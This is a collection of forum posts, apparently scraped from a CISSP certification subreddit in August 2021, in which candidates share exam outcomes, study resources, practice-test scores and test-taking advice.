Thinking about cancelling my upcoming test (four days away). Was scoring in the 80's on the Sybex official practice exams and figured I was ready. Then I watched Larry Greenblatt's CISSP questions on youtube and got almost all of them wrong (always narrowed it down to the correct two and then chose the wrong one). Then I took Thor's Hard CISSP Questions exam on Udemy today and scored 60.  Perhaps I'm rushing the process. Been studying for about 10 weeks.

This would be my first attempt and is paid for. Any further attempts would be out of pocket, though the expense doesn't bother me too much. Any feedback would be much appreciated.",2021-08-15
1557,p4cpze,Chinny Chin CISSP,"Okay, a little context.  I'm a 30 year IT professional with the last 10 as a CIO.   As I get closer to retirement, I thought it would be interesting to see what I'd learned by pursuing some certifications and then maybe do some teaching/consulting in security when I'm ready to bag it.  I decided to do the following certs CISA, CISM, CISSP starting in June.  Passed CISA in June and was certified soon after, CISM in July and certified a week ago and today I took the CISSP.

Last week I was doing some consulting near Buffalo and had a flight home to South Carolina scheduled to arrive at 5:30pm yesterday.  Due to delays and canx I ended up getting home at 2am.  My CISSP exam was set for 9:30am this morning.  Barely got up in time, just made it to the test center half asleep, etc.  Anyway I provisionally passed in 2 hours.  (ISC) Squared folks were were nice enough to let me do 150 questions.  :)

I didn't do much prep for any of these......probably 10 hours for the CISA, maybe 15 for CISM and 20+ for the CISSP.  For CISSP I used Mike C's videosthat on linkedin learning, the Official Study Guide, Thor's free  videos and the MindMap videos on YT.  

I had very little encryption stuff on the exam, lots and lots of questions about role based access and her cousins, didn't have to use the calculator, the math was simple, lots of scenario questions (trick being to find the special word), more application security stuff then I expected, very little auditing, some governance and some process sequencing questions.  

Basically, the stuff I had to learn was really official ISACA and (ISC)2 terminology for things I'd been doing as a CIO/Director, etc., for years.  Strangely, the language on the test today seemed to written by somebody with a thesaurus on his/her desk.  Other than proving that I could read, I'm not sure what that accomplished.  The goal was supposed to be comprehending concepts but using weird sentence construction  and possibly invented adverbs struck me as very weird.  Anyway, that's nitpicking.

Last thought, I've seen a lot of comments and debates about ""which is harder"" between the CISM and the CISSP.  Got to say, neither one is what I'd call very hard but it is absolutely true the CISSP covers a great deal more information while ISACA seems to break it up between a few different exams.  Makes sense given the focus of the organizations is not the same.  I'd be happy to answer any questions about my experience today or before.  If not, congrats to those who have been certified and good luck to those that are working towards!",2021-08-14
1558,p3q71k,Passed at 150 questions yesterday.," I managed to hit a hanging curve yesterday and pass. 
  
###### I removed a bunch of information that may or may not be under NDA ######
  
I think what prepared me was looking up the answers to questions I missed when taking the practice tests, remembering the golden words, and the standbys like ""is the word from the question in the answer?"" etc. and SLOW DOWN! I finished in an hour and a half and I forced myself to read each question, all the answers COMPLETELY, and then the question again and try to pick it apart looking for words that were key to the answers. 3 hours is more than enough time so take your time.  
The questions weren't tricky, per se, but I had a few that would ask what would you do if you had a scenario where you had (condition 1) and (condition 2)?  And the conditions were basically the definition of (this term we studied). So you have to know the information to know what term is being asked.   
     
Some other notes from a peer that recently passed and I used:  
1-I created a crib sheet of the things I struggled with, wrote them by hand 4-5 times.  Memorized that enough that I spent the first 10 min writing out that sheet.  Honestly I only referred back to it 3-4 times but it at least got me started.   
2- I did a ""vocabulary"" exercise the day before the exam, where I just flipped through our course books and read words and defined them. I think that helped more than I know.    
3-  I took a few mental breaks during the exam to battle my impatience.  I would start to hurry and not read all the way through Q/A so I would stop and and stare at my desk for 30-60 seconds.  ""Brought me back"" to focus.

1560,p3jdsz,"Obligatory ""passed at 103"" and some tips I haven't seen elsewhere","Passed today at 103!  Didn't have a lot of prior CISSP relevant experience (I have the required job experience, but most of my jobs barely touched on security topics).  The Security+ has about 50% overlap with the CISSP, and I highly recommend taking it first.  Consistently averaged 70-75% on all CISSP practice question banks across multiple platforms.  


Tips I haven't seen elsewhere:   
\-The test requires a good bit of reasoning / IQ test style stuff, and English comprehension.  A dozen questions had long paragraphs of information with one or two key words that totally changed the ""correct"" answer, so be sure you pay attention to *every single word* in the long format questions.

\-Skim the question, read the answers, then read the question carefully again.  The answers frequently tell you what part(s) of the long paragraph are the most important.

\-Brain dumping in the exam room: memorizing key acronyms/mnemonics, security models, OSI model, basic ports, encryption and hashing algos, other models, formulas, etc is a good idea.  When necessary, come up with your own ways to remember them rather than relying on frequently terrible mnemonics in books.  Once you're in the exam room, guess what!  You're allowed to brain dump everything you memorized on to paper!  This helped me save a lot of brain clock cycles, as I didn't have to run through everything I'd memorized mentally, and could glance at the paper for the relevant information. 

\-As Handerhan mentions, when ethical questions are at stake, lean towards the most ethical.  I don't want to elaborate further, but one question I got was really tailored to make me choose the ""unethical"" route, and IRL I likely would have - because I personally IRL knew the ""correct"" answer, and the ""unethical"" answer really wasn't unethical IRL -- but in the exam, you frequently have to work with the information presented in the question.  

\-About 3 of the questions were totally baffling.  I'd never read or heard about any of the concepts in the question or answers, and the question itself wasn't entirely clear.  Try to suss out what they're getting at, eliminate incorrect or non-real answers, and roll the dice.

\-Read the question and answers multiple times.  Every word.  Don't reflexively give the seemingly correct technical answer when an obfuscated better answer may exist.  

\-Seriously, a lot of it is reasoning.  Figure out the key points of the question, eliminate wrong answers, then make a detailed mental analysis of the remaining answers.

\-You will encounter questions you've no idea what the answer is.  Think on it for a few minutes (you have time), eliminate wrong answers, guess, and move on.  This isn't a test you must get a 90% on to pass.  Many options are debatable.  

\-When complex topographies are described, try to imagine it in your mind, with the flow of traffic.  But I'm a visual thinker, YMMV.

\-Day of the exam: schedule the exam for a time of day that you're usually mentally sharp, sleep well, eat light meals, take your usual amount of caffeine (I like L-theanine, a natural supplement extracted from green tea that calms caffeine and brain jitters - not woo woo, it is proven.)  Watch Greenblatt's 2018 and 2020 Exam Tips on YT, and Handerhan's ""why you will pass the CISSP.""  Get out of the IT grunt mindset and in to the master mindset.  Greenblatt's ""think like Kirk and Spock"" metaphor actually helped me on a couple questions.  I'd catch myself being too Spock-analytical, switch to Kirk mode, and the answer would pop out.  Wear comfortable yet professional clothes to the exam (a nice outfit can psychologically make you feel important and get in the mindset, IMO), wear a short sleeved shirt in case it's warm, and bring a light jacket in case it's cold.  

\-My personal pre-public speaking/important moment ritual: Take a minute or two to collect your thoughts and calm your mind.  Imagine yourself striding out successful.  Find a wall and stand against it and fix your posture.  Smile.  Feel the badassery flow through you.  YOU have come far enough and learned enough to sit for this $750 exam.  You can do it.  If you fail, there's always 30 days from now.  Breathe, stretch, fix your posture again, smile, and get to work!      


\-Read CISSP Sybex 8th edition once  
\-Listened to Inside Cloud and Security free youtube videos while in the car - they have great free pdfs of the slides for study - Mind Map videos are more entertaining to watch, but the shorter video format isn't conducive to car rides.  
\-Paid $20 for Pocket Prep for a month - it was useful to get info on what domains to focus on and to have a portable practice option.  Questions seemed very similar to the Sybex free questions.  A day before the exam, I went through and cleared out all the missed questions by getting them correct.  
\-Did a few hundred Sybex practice exam questions - would tab out and google stuff as needed to reinforce.  
\-These ""cheat sheets"" are also awesome: [https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf](https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf) (change the last number of the URL to 1 through 8 and download each)",2021-08-13

As for studying, I went through a free CISSP boot camp thing that Syracuse University provides for veterans called Onward 2 Opportunity, which isn't much different than any of the 20 hour CISSP training courses on Udemy but it includes all of the official training and practice exam books (barely touched the extra resources) and an excessively in-the-weeds practice exam system through Percipio that helped with learning way too detailed information about things that didn't matter.

For studying, i used a wide variety of material including a one week intense bootcamp which was very expensive - all paid for by work. If honest, I think the best was Thor Peterson online material with questions and Boson.

One piece of advice I'd like to share is simple. When studying you have to know the whole syllabus and how it connects. Sounds obvious but I failed on this before and i sacrificed on areas of knowledge I wasn't strong on and it cost me dearly.

Second, and last I promise, is track your progress. I kept weekly, daily scores of my test results broken down by domains to help visualise my strengths and weaknesses.  It helped loads.

1567,p2pmjp,Passed CISSP,"Hello Everyone,

After studying for the past 4 or so months, I took the test this AM and passed on my first attempt. Very excited about this as I was very nervous and obviously heard how difficult it was pass. Although I was not confident until I received the printed copy on my way out that said ""Congratulations"", the exam felt very passible as I was going through it. However, once I got to question 100 and it kept going, I started really getting nervous. Once I got to question 120 or so, it kicked me out and I was happy to read that I passed.

A quick background on me. I started in IT back in 2005 as a college student doing desktop support/sys admin work and have been working in a security focused roll since 2012. The past 5 years, I have been working in risk management with GRC as my current roll. 
Now to get to what some of you may actually be interested in hearing about.

I signed up to take the exam on June 5th 2021 sometime in March 2021. Sign up or you won't actually commit to studying. The exam was 700 at the time (now it's 750 since they released the 2021 CBK on May 1st). I can't stress this enough, sign up and pay for the exam. Otherwise, don't waste your time.

I joined certification station on discord. Great community with resources, I recommend doing the same. Adam Gordon from IT Pro TV supports this channel an offers free boot camps to those interested. He also provides all his notes and information on this channel. You can grab it at anytime and just read through them. I was fortunate enough to catch the beginning of his CISSP boot camp which lasted 8 weeks (1 week per domain) at 4 hours/week (2 days/2 hours). Halfway through the boot camp, I realize the CBK was updated with lots of new material which spooked me so I pushed my exam from June 5th to August 11th.

I also had a copy of OSG 7th edition which I read through over the course of a few months. Highlight through it so you can go back and review it. After finishing the boot camp and completing the book, I went back through my highlighted notes leading up to the exam.

I signed up for CCCure test engine that has 2000+ questions for CISSP. I suggest either doing the same or something similar. Go through questions as much as possible. I probably went through those questions several times, answering 4000+ questions. I started going from low 70% results at 20 questions and doing better and better until I was getting about 90% for 150 questions. Questions aren't the same by any means but the topics similar and really helps you think through the questions and answers.

This past weekend, I took Kelly H's. boot camp on Cybrary over 3 days, about 6 hours/day. The material felt a little dated but still helpful.

Last recommendation is watch ""Why you'll pass the CISSP"" by Kelly H and ""CISSP Exam 2020 Exam Tips"" by Larry Greenblatt on Youtube. Both of them provide a lot of information on how to think through the exam. The exam is technical but you are not support to answer the questions from a technical view point but as a risk advisor.

In regards to actual studying on a daily basis, I'd study a few hours each day to continue momentum. I'm a father of 2 who loves to spend time with my family. Even though the exam was difficult, it was very passible.

Good luck and reach out if you have questions! Always happy to chat and help.",2021-08-12

1569,p2apwi,Passed CISSP exam in first attempt,"Hi All,

I am happy to inform that I have passed my CISSP exam in first attempt on 26th July’21 and I am happy to share my study plan.

Before reading further, my suggestion to people is that once you have decided to give CISSP exam then don’t stretch your study plan. Once you decide, start preparing and register for the exam and crack it. Once you have decided, nothing can stop you.

And yes, don’t register for the exam unless you want to sacrifice your sleep, social life, social media, web series, movies, and some amount of family time as well. (this is just small list I can recall now). But yes, in the end all efforts are worth it when you get that congratulation print out!!

Thankfully, with school-going kids and my husband also preparing for his certification exam, I got a full study environment at home. 

**Suggestion while preparing for Exam** 

Make notes of important point, preferably handwritten. It will help you to understand better.

I started my preparation in Jan (it was my new year resolution). I followed the below timetable, and the timings were like 

1) Jan to Apr – 5 hours daily (4:30 AM – 8:00 AM & 9:00 PM -10:30 PM)

2) April to May – 1-2 hours daily, as I was quite distracted due to covid situation around and unable to focus

3) June – 5 hours (5:00 AM – 8:30 AM & 9:00 PM -10:30 PM)

4) July – First three weeks – 6 hours (4:30-8:30 and then 8:30 PM – 10:30 PM) and weekends full day.

5) Last 4 days before the exam – Almost 14-16 hours/daily starting from 2:30 AM, till the time my mind gives up. Had to stretch a lot

**I have studied from below listed books –** 

1. CISSP Certified Information Systems Security Professional Official Study Guide 8th edition - Read it once (skipped chapter which I was very familiar like Risk, BCP, DRP, Asset, etc) – 8/10

2. Kelly Handerhon course at Cybrary, Although it doesn’t cover the full syllabus, concepts explained well – 9/10

3. Sari Greene course at O'Reilly – 27 hours plus, it's good for second understanding. In my case, exam pattern changed May onwards, and I studied old book, so I went through Sari Greene video as the content was updated with the latest syllabus– 10/10

4. Adom Gorden Question of the day at LinkedIn – I finished all questions in just 4 days. Go through the explanation also – 10/10

5. Thor Peterson training and question set at Udemy. It’s good for revision 8/10

6. Prabh Nair youtube videos – His all youtube videos are too good. Just go for all CISSP videos it's good especially SDN, SAML, COTS, etc 10/10

7. Eric Conrad’s CISSP Study Guide 11th Hour – Reviewed only last chapter 7/10

8. Mike Chapple videos on LinkedIn learning – His videos are excellent, especially for domain 4, to understand network concepts in a much better way – 8/10

**Last week before the exam –** 

9. Review all your handwritten notes

10. Luke Ahmed book – How to think like Manager – 7/10

11. Review Prashant Mohan Memory Palace second last day before exam – 10/10

12. CISSP Mind Map by Rob Witcher on youtube – His videos are super helpful; I watched his video for the second time last day before the exam. If possible, I would rate as 11/10 :D

I Solved \~3,000+ questions and still felt unprepared.

**Exam day -** 

Although it's recommended to sleep for 8 hours and I would suggest the same, but I could hardly sleep for 3 hours in the night due to the exam stress and I woke up at 1:45 AM, revised my handwritten notes. Just before leaving for exam, I again watched Kelly’s Video on **why you will pass the CISSP exam** and the Test-taking strategy slide from Sari Greene's 27 hours video to ensure you have a good mindset. 

I reached the examination centre at 7:30 AM. 

I was little confused for the first few questions and wasn’t sure if I was reading the questions correct. I relaxed, did some breathing exercises, and focussed on the test.  Although I was initially stressed but after 40-50 questions, I started gaining confidence and after around 80 questions I started feeling that I would pass the exam. 

CAT format can play psychological games as the questions vary in difficulty based on your previous answers and If you are able to respond one question easily, next question will be super tough. I was able to understand the questions and even if I was 100% sure with the answer, I used the elimination technique.

Finally, trust yourself, trust your preparations, be positive, read the question, re-read the question, select the answer based on the elimination process (just to be double sure, as this exam is CAT and you don’t have the option to go back and change response later), only then click on next. And once you get the printout you will forget all your struggle and celebrate. 

I tried my best to pen down all the things. Feel free to ping me in case you required any additional information. All the best for your preparations",2021-08-11

1572,p209gl,Passed using only free military resources,"So first up, I passed today at 100 questions in 80 minutes.  And I spent the first 10-15 minutes writing down a bunch of information to warm up (a bit of a mindset trick I picked up from taking the PMP). I think I referenced it maybe once and that was only to verify the steps within the RMF. Honestly, the questions were so easy they were hard. I could make the case for any usually 2-3 and the “think like the manager” was a bit at odds with some of the practice questions I had. So it was a toss up to choose an easy technical control or report the situation up through the process for someone else to figure out. 
  
Anyways, I passed. So what I wanted to do here is provide some **free** resources to all the people in the military (guard/reserve/active) that are thinking about pursuing a CISSP. I paid $0 out of pocket for this cert and you can too. Disclaimer: I do have a bit of background in IT project management and cybersecurity, but still I think these resources are more than enough    
  
* Udemy.  [DigitalU.]( https://digitalu.udemy.com) So the Air Force is paying for an business license and you can use your .mil email to register and say you are in the AF. [Thor Pedersen]( https://www.udemy.com/user/thorpedersen/) covers a lot of the CISSP material.
* [O’Reilly Media.]( https://www.oreilly.com/online-learning/government.html) I had to email their customer service to get them to activate a free license for me, and that took about 7 days. Gives access to lots of free ebooks and some test, to include Sybex’s official book and practice tests.
* [Wiley.]( https://www.efficientlearning.com/) Used the free ebook from O’Reilly and registed to use Wiley’s practice engine. This is where I spent most of my time.
* [Army Ignited.]( https://www.armyignited.com/app/) Love it or hate it, this is here to stay. You will have a $4000 pool every year to use on certifications or regular Tuition Assistance. I am simplifying, but if you fail you have to pay the voucher fee back. Instead, you can enroll in a training course and get a “certification of completion” to say you have completed the course (but it just so happens to also include a voucher). And if you fail the real CISSP exam, you still pay nothing back. I did this route. I didn’t do any of the videos, just printed out the cert.  For more info about it or why, see [here]( https://www.cool.osd.mil/army/costs_and_funding/army_ca_faq.htm).
  
And there you have it--a somewhat easy guide to use for CISSP or really any certification. Also 2 other free resources I used were [Destination certification,]( https://www.youtube.com/c/DestinationCertification/playlists) which provided a decent overview/review (though I wouldn't use it for much beyond that). And Isc2’s [Glossary,]( https://www.isc2.org/Certifications/CISSP/CISSP-Student-Glossary) to just ensure you are operating with the same language.",2021-08-10
1573,p24uqd,Passed at 100 questions today,"I think the things that helped me the most

1. Consistent study plan over several months. One hour per day during work week.
2. Boson practice exams. Worth the 90 bucks. Definitely the most similar practice questions to the exam.
3. Larry greenblatt on YouTube. He is a little hippy dippy but give him atleast 40 minutes of your time before you move on. His mindset helps you choose the best answer when you narrow it down to two or three answers.
4. Luke ahmed “think like a manager” book. This helps you understand that you should always prioritize policies, thinking before you act, and risk management. Again, helps pick the best answer.
5. Read the questions twice, atleast! I passed at 100 questions at exactly two hours. There were two questions where i was like “ok no clue move on”. But for the others, especially the ones that seems way too easy, read it again! There are almost always two answers that are right. Ask yourself - which is more specific? Is one answer too generic that now the scope is huge and you would waste money? 
6. Wear contacts. My glasses fogged so bad and it was distracting because of covid.
7. Be prepared for some noise distractions and don’t let it ruin your exam. The person next to me cleared their throat every 30 seconds and I was so angry. I broke the marker. Took a deep breath. And told myself to never give up. And then I went back to it.
8. This is a technical exam! You should know how the technologies work. Study what you don’t know and do a deep dive. Worst case scenario you understand a security topic like PKI really well and you use it in your job 3 years from now.

I’m glad I passed. I honestly don’t know if I would have had the strength to keep studying and retake. For those of you that keep failing and keep trying - you are strong. Keep pursuing what is meaningful to you and don’t let anything ruin your relationships and whatever else is important to you.",2021-08-11

1577,p1at9r,Passed CISSP exam first try with ~5 months of study,"Hey everybody,

So I've been holding off to make this post until I had received my [official pass results](https://imgur.com/bkZZkEx) and sent in my application for endorsement.  Since I sent off my application the other day, I figured it was time to share my story.  This is going to be a long one, so I'll break it up into sections so you can read what you want.

    My Exam Experience

I wanted to start with this section as I feel it's the most important.  I took my exam at a professional Pearson testing center, about 2 hours away from my home.  My exam was on a Thursday, so I took that week off of work and reviewed every day from the moment I got up to the moment I went to bed.  I would wake up, chug some coffee, get to work, and sip on GFUEL all day to keep focused.  The day of my exam, I slept in, went for a walk, went out to IHOP for breakfast, and then drove to the testing center where I was an hour early so I could find the room where the exam was and then review in my car for a bit.  Going into the exam, I did not feel prepared, or that I knew all the information needed... but I have a rule about sticking to my exam date otherwise I'll keep pushing it back.  I figured if nothing else, I was about to take a REALLY good (and expensive) practice exam.  I honestly could have probably used another month of study to feel more comfortable.

I read some study that people who take adaptive exams generally score higher if they take their time on their first 10 or so questions, so I did that.  My overall strategy was that I would plan for like 110 questions, and then probably fail.  But I wanted to take my time and thoroughly read each question.  I figured my chances of actually going up to 150 were slim.  After the first 20 or so questions, I felt like the exam was focusing on all those little protocols, frameworks, and acronyms that you generally see once in your studies and brush off as not important.  It really drilled down on topics I didn't spend a lot of time on.  I received multiple questions about SOC, and honestly I could not recall the differences at all.  Pretty sure it kept asking them because I kept getting it wrong (be sure that when it was all over, I went and studied SOC).  After about 60 questions, I felt exhausted.  I felt like most of stuff that I studied and focused on memorizing didn't show up at all.  I stressed over memorizing Common Criteria tiers just before going in... not a single question about it.  Memorized SDLC and RMF... nothing about those.  I don't want to go into further detail due to NDA, but yeah.  Overall, around question 80, I was actually getting kind of mad lol.  I felt like 80% of my questions were ""what should you do if this happens"" or ""where would you find this listed"" types of things.  Overall it seems to be less about knowledge you've studied, and more what is best for this certain situation.

I focused hard until I got up to question 100, and before I clicked the button to submit my answer, I prepared myself to have either terribly failed, or totally passed.  I didn't know which.  It seemed like either my overall train of thought was going to be correct, or it wasn't.  After question 100, I had about 40 minutes left.  I kept slogging through each additional question, expecting the exam to end.  I ended up going all the way to 150 questions and ended with just seconds to spare.  I really had to kick up my speed after the initial 100, and I did NOT expect to go to 150, and had planned my slow reading strategy based on that... oh well!  I was exhausted when the exam was over.  I took my folded printout, went to the bathroom, then got in the elevator down to the parking garage.  I opened the printout in the elevator, and saw ""Congratulations!"" on the first line.  I let out the biggest and loudest cheer in my life.  I then had to sit in my car for 20 minutes before driving home just to relax and recover from the exam.

I'd love to be able to tell you ""study this"" and ""don't study this"", but honestly from all my time on here and asking others who have taken the test, it's impossible to say what's important and what's not.  Things I was told were super important didn't show up at all, and things I was told not to focus on popped up several times.  For the first day after I passed my exam, I was actually a bit angry because I felt like I spent so many nights focusing on learning material that didn't show up at all on the exam... but I realized that they can only quiz you on so many topics with such few questions.  So I must have shown early on that I knew certain related things, and diving deeper would be pointless.

    My Previous Experience

I have my Bachelor of Science in Computer Information Technology, but I wouldn't say this was much help aside from test-taking experience/strategy.  I achieved my CCNA last year, which made Domain 4 a breeze.  I got my Security+ in January, which I think was a good stepping stone into CISSP as it covered a lot of initial topics... Basically everything you learn in Sec+ is utilized in CISSP, so I don't see a downside to taking it first.  In February and March I took the AZ-900 and AI-900 exams since I got free vouchers from Microsoft's cloud skills challenges, so that helped me introduction to cloud topics (which is about as deep as CISSP goes).

I've also been working as a ""Server & Network Administrator"", leading the Network & Security team and Helpdesk team.  I've been working here for a little over 5 years, since I was hired on to an empty team right out of college, and learned everything on my own as I went.  It's been a long journey of having to just ""figure it out"" since I didn't have a mentor or someone who could teach me.  Just lots of google, troubleshooting techniques, trial & error, and tackling problems as they came along.  My job responsibilities include creating and managing Windows servers, SAN devices, a lot of old undocumented proprietary software, automation through powershell & command prompt scripting, data backups, SQL database management, IIS, active directory, DHCP, DNS, and network device (routers, switches, etc), PCI DSS audits, etc.  Basically a jack of all trades, master of none.

Originally I was going to go down the Networking route, but for these past couple years, I've been on a daily call with our parent company's Security team, and one of them mentioned having previously worked in Networking, but moving to Security as the market was in higher demand and the pay scale was higher, which perked up my ears.  I mostly sit quietly on the call and wait for something about our office or users to be mentioned, but being able to listen to them talk smart guy stuff and go over the SIEM and other cool software has been a huge motivator.  Then they recommended I go for CISSP.

Luckily, my job responsibilities have included things such as PCI DSS and ISO audits, and generating policies and procedures (Domain 1), data encryption and access controls (Domain 2), vulnerability scanning, patching vulnerabilities, establishing virtual & physical servers, and public server cryptography (Domain 3), network device configuration and hardening as well as port security (Domain 4), active directory and user security rights management (Domain 5), and (*unfortunately*) incident response and log management (Domain 7).  Thus, while I haven't worked specifically in security, I have had a little bit of experience across a lot of things... which I thought kind of fits perfectly with the ""mile wide, inch deep"" mentality.  I wouldn't say my experience was very big, but it helped me relate certain topics to work.

    My Resources

So... I kind of get nervous when it comes to studying and try to [get every resource](https://imgur.com/utz3mdE) I can find.  Which is a bit overkill, but at least I can see what sticks with me.  Admittedly, I'm more of a visual learning than a textbook reader.

**Thor Teaches on Udemy**    
This was my main resource, and where I gained the most knowledge.  I would load up these videos whenever I could focus and stare at the screen.  I even picked up a Microsoft Wireless Display Adapter so I could cast my browser on my Surface to my TV and sit on my couch and listen.  Great content, and his notes were fantastic.  I ended up printing out all his PDF notes and putting them in sheet protectors in a binder.  The only thing that sucked is that by grouping the lessons into two-domain courses, some courses (like the one that includes D3 & D4) end up being much higher value than the ones that focus on smaller domains.  Still, I'd highly recommend the series.  9/10

**Certification Station on Discord**    
This server on Discord was fantastic.  It really kept me motivated, and helped me work through the thought process on various questions.  If you stay active in the channel, you'll end up doing hundreds of practice questions without even thinking about it.  11/10

**MindMap videos by Rob Witcher on YouTube**    
I'm pretty sure I'm responsible for hundreds of plays on these videos.  These videos became my main audio source while walking or driving to work, and I'd even listen to them as I went to sleep.  It's a great way to refresh important topics as well as quickly go over a chapter before diving into it with a main resource.  And they're free.  Not enough deep info to learn everything, but just about the perfect  review resource.  You're crazy if you don't utilize these.  10/10

**CISSP Cert Prep (2021) by Mike Chapple on LinkedIn Learning**    
Some people like Mike Chapple's teaching method, and some don't.  But his updated LinkedIn Learning videos are very well produced, and include chapter quizzes to make sure you're taking in information rather than just zoning out.  It was another source I used primarily for audio, or for getting another perspective on a confusing topic from Thor's videos.  I do think it sometimes focused on less important things and glanced over big topics, but that may be because the course is designed to go along with the Official Study Guide textbook.  7/10

**Kelly Handerhan's CISSP course on Cybrary**    
Kelly is very passionate about what she teaches, which helps keep you motivated, but this video series really lightly glosses over the information.  It can serve as a good review or refresher, but shouldn't be your main video source.  However, it's free, so still nice.  5/10

**Adam Gordon's notes**    
So everyone on Certification Station knows of Adam's notes, which are freely available on the Discord server.  They've been formatted into a nice format by some users in the server that have made reading a lot easier.  I'm not sure if his ITPro.TV course offers something nicer, but I'd say the only thing these notes lack is looking nice and organized.  Otherwise, they are FULL of information and tricks to help remember certain things.  I'd highly recommend reading through these at least once.  8/10

**ISC2 CISSP Official Study Guide (2018)**    
Honestly, I didn't use this much.  I tried to read through it, but I felt it really dragged on through certain topics.  There's no reason Domain 2 should get as many pages as it does.  After reading through a few chapters, this became more of a reference book.  I'm sure it would be great for those that can read through it in full, but I couldn't do it.  6?/10

**CISSP Study Guide (3rd Edition) by Eric Conrad**    
I picked this book up because it was shorter than the OSG.  Where the OSG wanted 140 pages for something, this book covered it in 60.  Most of the reading I did came out of this book.  I highly preferred the condensed design, but the book was certainly showing its age.  This ""latest"" edition is from 2016, and could do with some updates.  6/10

**CISSP For Dummies (6th Edition)**    
I felt this book was great!  I don't see it recommended here enough.  It's from 2018, so reasonably updated.  I didn't read it through fully, but I could see it being a very competent primary reading source.  I used it mostly for reference to double-check things that didn't make sense in my video studies, or practice questions that confused me.  The only thing really lacking in this book is that the site for redeeming the online practice exams is defunct, so you have to call their support line to get an activation code on their new site.  Not a huge issue as I didn't really use their practice questions, but a noticeable issue.  It's also still smaller than the OSG.  7/10

**11th Hour CISSP by Eric Conrad**    
This book was just ok.  I bought both the physical and Audible versions.  Some people said they used it as a review after going over everything, but I think it's too light for that.  I think it would do well as an introduction book when you're first starting your studies and want to dip your toes into each domain first over the course of 200 pages.  Nothing to really learn much info from, but a good way to understand the general topics you'll be diving into.  5/10

**The Effective CISSP by Wentz Wu**    
This book is designed to be a focus on Domain 1 and 2, with a touch of 3.  For the most part, it does that.  I was expecting it to go into further detail than what I had already learned, but that wasn't really the case.  If you've paid attention in your primary study source, this will mostly just repeat what you've already learned, but that can be nice if it's been a while since you went over these topics.  It does give a good description between various steps and such.  Is the book necessary?  Not really... but if you want to hammer in these particular domains, it's a nice addition if you have time.  7/10

**How To Think Like a Manager by Luke Ahmed**    
I'd definitely recommend this book.  It's cheap, and goes over 25 questions and the thought process you should go through.  Best of all, it goes through a VARIETY of questions you would go through, such as ""pick the best out of a list of potentially correct answers"", ""you can easily eliminate two of these"", ""the actual question is asking you for something that can specifically be answered by only one of these"", etc.  The only issue I had with the book was one question (Q14) that focused on firewall architecture ""tiers"", which is not listed in any textbook, and the only video source I could find was one by Luke, and I still couldn't determine what a ""three-tier 2"" architecture and such were.  I spent a couple hours trying to figure this out, but then all of Certification Station agreed it didn't make any sense, and wouldn't show up in the exam, which it didn't.  8/10

**CISSP Exam Guide Ultimate Edition 2021 by Walter Roberts**    
Look... Stay away from this.  It's useless.  The layout is terrible, it looks like it was typed up in Microsoft Word and printed, it skips over important information, and focuses way too heavily on stupid stuff (we don't need two pages on what Malware is).  When I was going through my CCNA studies, I found a cheap book on Amazon called ""CCNA 200-301 Quick Reference Guide"" that was like $12, and 112 pages.  It included all of the exam objectives with a brief description and notes about each objective, allowing the reader to quickly reference each objective and see if they knew the topic or needed to read more.  I was looking for a cheap book that did something similar... just a quick reference of each topic so I could determine if I've missed something.  This book was not that.  At all.  The only reason it gets any points is because it was cheap.  2/10

    Practice Exams  & Quizzes

I used a ton of practice exams and quiz sources... I used the official ISC2 practice exam book, I used CCCure, I used practice questions from all the textbooks above, I used the new Pocket Prep app (whatever it's called now), Wentz and Adam's Q of the Day, etc.  Certification Station itself is a huge conglomerate of practice questions from various sources, so its hard to tell which one was which.  I wouldn't say I went through thousands of questions like many people here... probably a total of like 500-600.  Like many people here say, the practice exams are not like the real thing.  There may be a question or two that pop in and seem similar, but generally those questions are freebie questions anyways (straight to the point definition-like questions).  What I really aimed to do was identify my weak spots and then study those sections.  For me, the new Pocket Prep app was really useful for this because it gives a readout of your proficiency in each domain so I could see which ones I was lacking, and then go back and review those.

But honestly?  Whatever you're using is probably fine.  Don't be like me and waste a huge amount of time and money trying to find the ""best"" practice exams.  There aren't any, and ISC2 send C&D's to people who create questions too similar to the real thing (like with Wentz).  So you're not going to find perfect practice questions.  Just find something that helps you pinpoint your weak spots, and then review those sections.  The best thing you can do is practice and test your knowledge, so just find something and study.  Try to use a couple resources if you can so you can get a variety.

    In Closing...

The exam was tough.  I'm still surprised I passed, but it's encouraged me to continue my studies.  I wouldn't say I'm wayyy more knowledgeable than I was before I started studying... but that may be because I had a good basepoint.  I certainly learned a few interesting and useful things, and hammered down some stuff that I lightly touched on in other certs.

I plan on taking CISM next since the material is similar.  A lot of people just said to go take a few practice exams and then take the real thing, but I want to read through a bit before taking it, as I still feel like there are some CISSP topics I'm not too familiar with.  After that, I'm hoping to either jump into CySA+ or eJPT... I just feel like I've taken a lot of certifications involving knowledge and procedures, but I still have a huge feeling of Impostor Syndrome, and I don't feel like I have as many practical skills as I'd like.  I was offered a few ""Senior Security Analyst"" positions just minutes after posting that I passed the exam, but I still feel too inexperienced.  So overall I'm trying to find something that can prepare me for a more security-centric job.

1581,p0gh9k,"Passed, 100q","Been seeing a lot of ""Passed!"" posts so thought I'd throw in my experience.

Just took the exam last night and passed at 100 questions at a little over an hour.

The key takeaway I want to pass on to you if you're studying: ***you can do it!***

Personal history: I'm old enough to have 2 kids in college, been doing IT and security since my career started in 1994, and I was a computer science major.  I've been involved in SOC audits, written security policies, and consulted with lots of companies regarding how to secure IT assets properly, including extensive HIPAA consulting.  Branched out and got EnCE forensic certification in 2014 and have been doing forensics and testimony in civil cases since then in addition to the other consulting.  Lots of other certs as well, including the suite of CompTIA and Microsoft. In a word, I have experience, and I know how to take tests.

I'd thought about getting CISSP starting in about 2010 but had put it out of my mind after seeing the commitment it takes to get it, and the Shon Harris book just sat on my shelf for 10 years afterwards.  Plus, I couldn't justify the cert as bringing anything to my resume that I didn't already have.  A colleague of mine wanted CISSP really bad though, so as a challenge I told him I'd go for it too.  We could study together and push each other along.  

2021 was our year, even with the exam being updated.  He is scheduled to take his in October and I've been encouraging him to study more, but life has a way of telling you that your focus needs to be on other things like family and work.  Same applied to me, but I started just giving myself little 10 or 20 question quizzes in between other obligations, or slipping in a Youtube video or a quick read of a few pages.  Eventually the quizzes worked up into 50 questions, and then I took full on 150 question exams.

Resources that are invaluable:

* RELEVANT EXPERIENCE.  This is passable without experience, but if you have worked even tangentially to security, lean on it.
